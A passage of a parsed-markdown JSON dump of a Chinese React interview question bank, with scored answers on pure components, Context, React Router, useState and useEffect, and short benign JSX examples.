什么是纯组件？为什么要使用纯组件？\\n\\n","depth":2,"text":"什么是纯组件？为什么要使用纯组件？","tokens":[{"type":"text","raw":"什么是纯组件？为什么要使用纯组件？","text":"什么是纯组件？为什么要使用纯组件？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- 纯组件：\\n\\n- 纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。\\n\\n- 优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。\\n\\n- 使用场景：\\n\\n- 静态数据：组件的 props 和 state 不经常变化。\\n\\n- 复杂组件：组件内部逻辑复杂，重新渲染开销大。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 纯组件：\\n\\n","task":false,"loose":true,"text":"纯组件：\\n","tokens":[{"type":"text","raw":"纯组件：\\n","text":"纯组件：","tokens":[{"type":"text","raw":"纯组件：","text":"纯组件：","escaped":false}]}]},{"type":"list_item","raw":"- 纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。\\n\\n","task":false,"loose":true,"text":"纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。\\n","tokens":[{"type":"text","raw":"纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。\\n","text":"纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。","tokens":[{"type":"text","raw":"纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。","text":"纯组件是一种特殊的组件，它通过 React.memo（函数组件）或 PureComponent（类组件）来实现。纯组件会在 props 或 state 发生变化时进行浅比较，如果前后值相同，则跳过重新渲染。","escaped":false}]}]},{"type":"list_item","raw":"- 优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。\\n\\n","task":false,"loose":true,"text":"优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。\\n","tokens":[{"type":"text","raw":"优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。\\n","text":"优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。","tokens":[{"type":"text","raw":"优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。","text":"优点：1、减少不必要的重新渲染，提高应用性能。 2、开发者不需要手动实现 shouldComponentUpdate 方法来优化性能。","escaped":false}]}]},{"type":"list_item","raw":"- 使用场景：\\n\\n","task":false,"loose":true,"text":"使用场景：\\n","tokens":[{"type":"text","raw":"使用场景：\\n","text":"使用场景：","tokens":[{"type":"text","raw":"使用场景：","text":"使用场景：","escaped":false}]}]},{"type":"list_item","raw":"- 静态数据：组件的 props 和 state 不经常变化。\\n\\n","task":false,"loose":true,"text":"静态数据：组件的 props 和 state 不经常变化。\\n","tokens":[{"type":"text","raw":"静态数据：组件的 props 和 state 不经常变化。\\n","text":"静态数据：组件的 props 和 state 不经常变化。","tokens":[{"type":"text","raw":"静态数据：组件的 props 和 state 不经常变化。","text":"静态数据：组件的 props 和 state 不经常变化。","escaped":false}]}]},{"type":"list_item","raw":"- 复杂组件：组件内部逻辑复杂，重新渲染开销大。","task":false,"loose":true,"text":"复杂组件：组件内部逻辑复杂，重新渲染开销大。","tokens":[{"type":"text","raw":"复杂组件：组件内部逻辑复杂，重新渲染开销大。","text":"复杂组件：组件内部逻辑复杂，重新渲染开销大。","tokens":[{"type":"text","raw":"复杂组件：组件内部逻辑复杂，重新渲染开销大。","text":"复杂组件：组件内部逻辑复杂，重新渲染开销大。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是 React Context API？它解决了什么问题？\\n\\n","depth":2,"text":"什么是 React Context API？它解决了什么问题？","tokens":[{"type":"text","raw":"什么是 React Context API？它解决了什么问题？","text":"什么是 React Context API？它解决了什么问题？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- React Context API：\\n\\n- Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。\\n\\n- 创建 Context：使用 React.createContext 创建一个 Context 对象。\\n\\n- 提供 Context：使用 Context.Provider 组件将数据传递给子组件。\\n\\n- 消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React Context API：\\n\\n","task":false,"loose":true,"text":"React Context API：\\n","tokens":[{"type":"text","raw":"React Context API：\\n","text":"React Context API：","tokens":[{"type":"text","raw":"React Context API：","text":"React Context API：","escaped":false}]}]},{"type":"list_item","raw":"- Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。\\n\\n","task":false,"loose":true,"text":"Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。\\n","tokens":[{"type":"text","raw":"Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。\\n","text":"Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。","tokens":[{"type":"text","raw":"Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。","text":"Context API 是 React 提供的一种在组件树中传递数据的机制，无需通过 props 逐层传递。","escaped":false}]}]},{"type":"list_item","raw":"- 创建 Context：使用 React.createContext 创建一个 Context 对象。\\n\\n","task":false,"loose":true,"text":"创建 Context：使用 React.createContext 创建一个 Context 对象。\\n","tokens":[{"type":"text","raw":"创建 Context：使用 React.createContext 创建一个 Context 对象。\\n","text":"创建 Context：使用 React.createContext 创建一个 Context 对象。","tokens":[{"type":"text","raw":"创建 Context：使用 React.createContext 创建一个 Context 对象。","text":"创建 Context：使用 React.createContext 创建一个 Context 对象。","escaped":false}]}]},{"type":"list_item","raw":"- 提供 Context：使用 Context.Provider 组件将数据传递给子组件。\\n\\n","task":false,"loose":true,"text":"提供 Context：使用 Context.Provider 组件将数据传递给子组件。\\n","tokens":[{"type":"text","raw":"提供 Context：使用 Context.Provider 组件将数据传递给子组件。\\n","text":"提供 Context：使用 Context.Provider 组件将数据传递给子组件。","tokens":[{"type":"text","raw":"提供 Context：使用 Context.Provider 组件将数据传递给子组件。","text":"提供 Context：使用 Context.Provider 组件将数据传递给子组件。","escaped":false}]}]},{"type":"list_item","raw":"- 消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","task":false,"loose":true,"text":"消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","tokens":[{"type":"text","raw":"消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","text":"消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","tokens":[{"type":"text","raw":"消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","text":"消费 Context：使用 Context.Consumer 组件或 useContext Hook 在子组件中访问数据。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是 React Router？它的主要特点是什么？\\n\\n","depth":2,"text":"什么是 React Router？它的主要特点是什么？","tokens":[{"type":"text","raw":"什么是 React Router？它的主要特点是什么？","text":"什么是 React Router？它的主要特点是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。\\n\\n- 主要特点：\\n\\n- 声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。\\n\\n- 动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。\\n\\n- 嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。\\n\\n- 编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。\\n\\n- 路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。\\n\\n- 懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。\\n\\n","task":false,"loose":true,"text":"React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。\\n","tokens":[{"type":"text","raw":"React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。\\n","text":"React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。","tokens":[{"type":"text","raw":"React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。","text":"React Router 是一个用于 React 应用的路由库，它允许你在单页应用（SPA）中实现多页面的导航和路由管理。","escaped":false}]}]},{"type":"list_item","raw":"- 主要特点：\\n\\n","task":false,"loose":true,"text":"主要特点：\\n","tokens":[{"type":"text","raw":"主要特点：\\n","text":"主要特点：","tokens":[{"type":"text","raw":"主要特点：","text":"主要特点：","escaped":false}]}]},{"type":"list_item","raw":"- 声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。\\n\\n","task":false,"loose":true,"text":"声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。\\n","tokens":[{"type":"text","raw":"声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。\\n","text":"声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。","tokens":[{"type":"text","raw":"声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。","text":"声明式路由：使用声明式的方式来定义路由，使代码更加清晰和易于维护。","escaped":false}]}]},{"type":"list_item","raw":"- 动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。\\n\\n","task":false,"loose":true,"text":"动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。\\n","tokens":[{"type":"text","raw":"动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。\\n","text":"动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。","tokens":[{"type":"text","raw":"动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。","text":"动态路由匹配：支持动态参数匹配，可以根据 URL 参数动态加载不同的组件。","escaped":false}]}]},{"type":"list_item","raw":"- 嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。\\n\\n","task":false,"loose":true,"text":"嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。\\n","tokens":[{"type":"text","raw":"嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。\\n","text":"嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。","tokens":[{"type":"text","raw":"嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。","text":"嵌套路由：支持嵌套路由，可以轻松实现多级嵌套的页面结构。","escaped":false}]}]},{"type":"list_item","raw":"- 编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。\\n\\n","task":false,"loose":true,"text":"编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。\\n","tokens":[{"type":"text","raw":"编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。\\n","text":"编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。","tokens":[{"type":"text","raw":"编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。","text":"编程式导航：提供编程式导航的方法，可以在代码中控制页面的跳转。","escaped":false}]}]},{"type":"list_item","raw":"- 路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。\\n\\n","task":false,"loose":true,"text":"路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。\\n","tokens":[{"type":"text","raw":"路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。\\n","text":"路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。","tokens":[{"type":"text","raw":"路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。","text":"路由守卫：支持路由守卫，可以在路由切换前后执行特定的逻辑。","escaped":false}]}]},{"type":"list_item","raw":"- 懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","task":false,"loose":true,"text":"懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","tokens":[{"type":"text","raw":"懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","text":"懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","tokens":[{"type":"text","raw":"懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","text":"懒加载：支持代码分割和懒加载，可以按需加载组件，提高应用性能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是 useState？它如何工作？\\n\\n","depth":2,"text":"什么是 useState？它如何工作？","tokens":[{"type":"text","raw":"什么是 useState？它如何工作？","text":"什么是 useState？它如何工作？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- useState 是一个 Hook，用于在函数组件中添加状态。\\n\\n- 主要特点：\\n\\n- 初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。\\n\\n- 更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- useState 是一个 Hook，用于在函数组件中添加状态。\\n\\n","task":false,"loose":true,"text":"useState 是一个 Hook，用于在函数组件中添加状态。\\n","tokens":[{"type":"text","raw":"useState 是一个 Hook，用于在函数组件中添加状态。\\n","text":"useState 是一个 Hook，用于在函数组件中添加状态。","tokens":[{"type":"text","raw":"useState 是一个 Hook，用于在函数组件中添加状态。","text":"useState 是一个 Hook，用于在函数组件中添加状态。","escaped":false}]}]},{"type":"list_item","raw":"- 主要特点：\\n\\n","task":false,"loose":true,"text":"主要特点：\\n","tokens":[{"type":"text","raw":"主要特点：\\n","text":"主要特点：","tokens":[{"type":"text","raw":"主要特点：","text":"主要特点：","escaped":false}]}]},{"type":"list_item","raw":"- 初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。\\n\\n","task":false,"loose":true,"text":"初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。\\n","tokens":[{"type":"text","raw":"初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。\\n","text":"初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。","tokens":[{"type":"text","raw":"初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。","text":"初始化状态：第一次调用 useState 时，传入的初始值会被用作初始状态。","escaped":false}]}]},{"type":"list_item","raw":"- 更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","task":false,"loose":true,"text":"更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","tokens":[{"type":"text","raw":"更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","text":"更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","tokens":[{"type":"text","raw":"更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","text":"更新状态：返回一个数组，第一个元素是当前状态，第二个元素是一个用于更新状态的函数。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```JSX\\nimport React, { useState } from \'react\';\\n\\nconst Counter = () => {\\n  const [count, setCount] = useState(0);\\n\\n  const increment = () => {\\n    setCount(count + 1);\\n  };\\n\\n  const decrement = () => {\\n    setCount(count - 1);\\n  };\\n\\n  return (\\n    <div>\\n      <h1>Count: {count}</h1>\\n      <button onClick={increment}>Increment</button>\\n      <button onClick={decrement}>Decrement</button>\\n    </div>\\n  );\\n};\\n\\nexport default Counter;\\n\\n```","lang":"JSX","text":"import React, { useState } from \'react\';\\n\\nconst Counter = () => {\\n  const [count, setCount] = useState(0);\\n\\n  const increment = () => {\\n    setCount(count + 1);\\n  };\\n\\n  const decrement = () => {\\n    setCount(count - 1);\\n  };\\n\\n  return (\\n    <div>\\n      <h1>Count: {count}</h1>\\n      <button onClick={increment}>Increment</button>\\n      <button onClick={decrement}>Decrement</button>\\n    </div>\\n  );\\n};\\n\\nexport default Counter;\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是 useEffect？它如何工作？\\n\\n","depth":2,"text":"什么是 useEffect？它如何工作？","tokens":[{"type":"text","raw":"什么是 useEffect？它如何工作？","text":"什么是 useEffect？它如何工作？","escaped":false}]},{"type":"heading","raw":"#### 类型：`拓展`\\n\\n","depth":4,"text":"类型：`拓展`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`拓展`","text":"拓展"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。\\n\\n- 工作原理：\\n\\n- 执行副作用：在组件挂载和更新时执行副作用操作。\\n\\n- 清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。\\n\\n","task":false,"loose":true,"text":"useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。\\n","tokens":[{"type":"text","raw":"useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。\\n","text":"useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。","tokens":[{"type":"text","raw":"useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。","text":"useEffect 是一个 Hook，用于在函数组件中执行副作用操作，如数据获取、订阅或手动更改 DOM。","escaped":false}]}]},{"type":"list_item","raw":"- 工作原理：\\n\\n","task":false,"loose":true,"text":"工作原理：\\n","tokens":[{"type":"text","raw":"工作原理：\\n","text":"工作原理：","tokens":[{"type":"text","raw":"工作原理：","text":"工作原理：","escaped":false}]}]},{"type":"list_item","raw":"- 执行副作用：在组件挂载和更新时执行副作用操作。\\n\\n","task":false,"loose":true,"text":"执行副作用：在组件挂载和更新时执行副作用操作。\\n","tokens":[{"type":"text","raw":"执行副作用：在组件挂载和更新时执行副作用操作。\\n","text":"执行副作用：在组件挂载和更新时执行副作用操作。","tokens":[{"type":"text","raw":"执行副作用：在组件挂载和更新时执行副作用操作。","text":"执行副作用：在组件挂载和更新时执行副作用操作。","escaped":false}]}]},{"type":"list_item","raw":"- 清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","task":false,"loose":true,"text":"清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","tokens":[{"type":"text","raw":"清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","text":"清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","tokens":[{"type":"text","raw":"清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","text":"清理副作用：返回一个可选的清理函数，用于在组件卸载或下次执行副作用前清理上一次的副作用。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```JSX\\nimport React, { useState, useEffect } from \'react\';\\n\\nconst DataFetcher = () => {\\n  const [data, setData] = useState(null);\\n\\n  useEffect(() => {\\n    const fetchData = async () => {\\n      const response = await fetch(\'/api/data\');\\n      const json = await response.json();\\n      setData(json);\\n    };\\n\\n    fetchData();\\n\\n    // 清理函数\\n    return () => {\\n      console.log(\'Cleanup\');\\n    };\\n  }, []); // 依赖数组为空，表示仅在组件挂载时执行\\n\\n  return (\\n    <div>\\n      {data ? <pre>{JSON.stringify(data, null, 2)}</pre> : <p>Loading...</p>}\\n    </div>\\n  );\\n};\\n\\nexport default DataFetcher;\\n\\n```","lang":"JSX","text":"import React, { useState, useEffect } from \'react\';\\n\\nconst DataFetcher = () => {\\n  const [data, setData] = useState(null);\\n\\n  useEffect(() => {\\n    const fetchData = async () => {\\n      const response = await fetch(\'/api/data\');\\n      const json = await response.json();\\n      setData(json);\\n    };\\n\\n    fetchData();\\n\\n    // 清理函数\\n    return () => {\\n      console.log(\'Cleanup\');\\n    };\\n  }, []); // 依赖数组为空，表示仅在组件挂载时执行\\n\\n  return (\\n    <div>\\n      {data ? <pre>{JSON.stringify(data, null, 2)}</pre> : <p>Loading...</p>}\\n    </div>\\n  );\\n};\\n\\nexport default DataFetcher;\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 在 React 组件中，useEffect 钩子的第二个参数（依赖项数组）为空数组和不设置有什么区别？\\n\\n","depth":2,"text":"在 React 组件中，useEffect 钩子的第二个参数（依赖项数组）为空数组和不设置有什么区别？","tokens":[{"type":"text","raw":"在 React 组件中，useEffect 钩子的第二个参数（依赖项数组）为空数组和不设置有什么区别？","text":"在 React 组件中，useEffect 钩子的第二个参数（依赖项数组）为空数组和不设置有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：基础\\n\\n","depth":4,"text":"类型：基础","tokens":[{"type":"text","raw":"类型：基础","text":"类型：基础","escaped":false}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","task":false,"loose":false,"text":"**1：** 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","tokens":[{"type":"text","raw":"**1：** 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","text":"**1：** 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 componentWillUnmount 的结合；不设置时，每次组件渲染\\n后 useEffect 都会执行，可能导致不必要的副作用反复运行。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 为空数组时，useEffect 仅在组件挂载和卸载时执行一次，类似 componentDidMount 与 